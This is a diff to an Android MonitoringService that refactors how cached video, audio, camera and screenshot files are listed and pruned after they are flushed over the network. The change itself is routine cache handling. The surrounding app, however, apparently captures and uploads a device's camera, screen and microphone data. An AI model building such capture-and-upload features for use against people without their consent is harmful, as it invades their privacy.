@@ -9385,11 +9385,14 @@ class MonitoringService : Service() {
             if (!hasNetwork()) return
             val flushDeadline = android.os.SystemClock.elapsedRealtime() + 600_000L
             var batches = 0
+            var lastFullListing: List<File>? = null
             drain@ while (batches < 3) {
                 val pending = try {
-                    cacheDir.listFiles { file ->
+                    val all = cacheDir.listFiles { file ->
                         file.isFile && file.name.startsWith("video_") && file.name.endsWith(".mp4")
-                    }?.sortedBy { it.lastModified() }?.take(max) ?: break@drain
+                    }?.sortedBy { it.lastModified() } ?: break@drain
+                    lastFullListing = all
+                    all.take(max)
                 } catch (e: Exception) {
                     break@drain
                 }
@@ -9426,11 +9429,11 @@ class MonitoringService : Service() {
             }
         } finally {
             videoFlushBusy.set(false)
-            if (videoProgress || droppedVideos > 0) pruneVideoCache(MAX_VIDEO_KEPT)
+            if (videoProgress || droppedVideos > 0) pruneVideoCache(MAX_VIDEO_KEPT, lastFullListing)
         }
     }
 
-    private fun pruneVideoCache(maxKept: Int) {
+    private fun pruneVideoCache(maxKept: Int, known: List<File>? = null) {
         if (videoFlushBusy.get()) return
         try {
             try {
@@ -9439,9 +9442,9 @@ class MonitoringService : Service() {
                 }?.forEach { deleteQuietly(it) }
             } catch (_: Exception) {
             }
-            val files = cacheDir.listFiles { file ->
+            val files = (known ?: cacheDir.listFiles { file ->
                 file.isFile && file.name.startsWith("video_") && file.name.endsWith(".mp4")
-            }?.sortedBy { it.lastModified() }?.filter { !isMediaActive(it) } ?: return
+            }?.sortedBy { it.lastModified() })?.filter { !isMediaActive(it) } ?: return
             val dropped = files.dropLast(maxKept)
             if (dropped.isEmpty()) return
             dropped.forEach { deleteQuietly(it) }
@@ -9465,11 +9468,14 @@ class MonitoringService : Service() {
             if (!hasNetwork()) return
             val flushDeadline = android.os.SystemClock.elapsedRealtime() + 600_000L
             var batches = 0
+            var lastFullListing: List<File>? = null
             drain@ while (batches < 3) {
                 val pending = try {
-                    cacheDir.listFiles { file ->
+                    val all = cacheDir.listFiles { file ->
                         file.isFile && file.name.startsWith("audio_") && file.name.endsWith(".m4a")
-                    }?.sortedBy { it.lastModified() }?.take(max) ?: break@drain
+                    }?.sortedBy { it.lastModified() } ?: break@drain
+                    lastFullListing = all
+                    all.take(max)
                 } catch (e: Exception) {
                     break@drain
                 }
@@ -9506,20 +9512,20 @@ class MonitoringService : Service() {
             }
         } finally {
             audioFlushBusy.set(false)
-            if (audioProgress || droppedAudio > 0) pruneAudioCache(MAX_AUDIO_KEPT)
+            if (audioProgress || droppedAudio > 0) pruneAudioCache(MAX_AUDIO_KEPT, lastFullListing)
         }
     }
 
-    private fun pruneAudioCache(maxKept: Int) {
+    private fun pruneAudioCache(maxKept: Int, known: List<File>? = null) {
         if (audioFlushBusy.get()) return
         try {
             val staleTmpCutoff = System.currentTimeMillis() - 6 * 60 * 60_000L
             cacheDir.listFiles { file ->
                 file.isFile && file.name.startsWith("audio_") && file.name.endsWith(".tmp") && file.lastModified() < staleTmpCutoff
             }?.forEach { deleteQuietly(it) }
-            val files = cacheDir.listFiles { file ->
+            val files = (known ?: cacheDir.listFiles { file ->
                 file.isFile && file.name.startsWith("audio_") && file.name.endsWith(".m4a")
-            }?.sortedBy { it.lastModified() }?.filter { !isMediaActive(it) } ?: return
+            }?.sortedBy { it.lastModified() })?.filter { !isMediaActive(it) } ?: return
             val dropped = files.dropLast(maxKept)
             if (dropped.isEmpty()) return
             dropped.forEach { deleteQuietly(it) }
@@ -9752,11 +9758,14 @@ class MonitoringService : Service() {
             if (!hasNetwork()) return
             val flushDeadline = android.os.SystemClock.elapsedRealtime() + 600_000L
             var batches = 0
+            var lastFullListing: List<File>? = null
             drain@ while (batches < 3) {
                 val pending = try {
-                    cacheDir.listFiles { file ->
+                    val all = cacheDir.listFiles { file ->
                         file.isFile && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg")
-                    }?.sortedBy { it.lastModified() }?.take(max) ?: break@drain
+                    }?.sortedBy { it.lastModified() } ?: break@drain
+                    lastFullListing = all
+                    all.take(max)
                 } catch (e: Exception) {
                     break@drain
                 }
@@ -9793,7 +9802,7 @@ class MonitoringService : Service() {
             }
         } finally {
             photoFlushBusy.set(false)
-            if (photoProgress || droppedPhotos > 0) prunePhotoCache()
+            if (photoProgress || droppedPhotos > 0) prunePhotoCache(known = lastFullListing)
         }
     }
 
@@ -9803,7 +9812,7 @@ class MonitoringService : Service() {
         } catch (_: Exception) {
         }
     }
-    private fun prunePhotoCache(maxKept: Int = MAX_PHOTO_KEPT): Int {
+    private fun prunePhotoCache(maxKept: Int = MAX_PHOTO_KEPT, known: List<File>? = null): Int {
         if (photoFlushBusy.get()) return -1
         try {
             try {
@@ -9813,9 +9822,9 @@ class MonitoringService : Service() {
                 }?.forEach { deleteQuietly(it) }
             } catch (_: Exception) {
             }
-            val photos = cacheDir.listFiles { file ->
+            val photos = (known ?: cacheDir.listFiles { file ->
                 file.isFile && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg")
-            }?.sortedBy { it.lastModified() }?.filter { !isMediaActive(it) } ?: return -1
+            }?.sortedBy { it.lastModified() })?.filter { !isMediaActive(it) } ?: return -1
             if (photos.size <= maxKept) return photos.size
             val dropped = photos.dropLast(maxKept)
             val remaining = photos.size - dropped.size
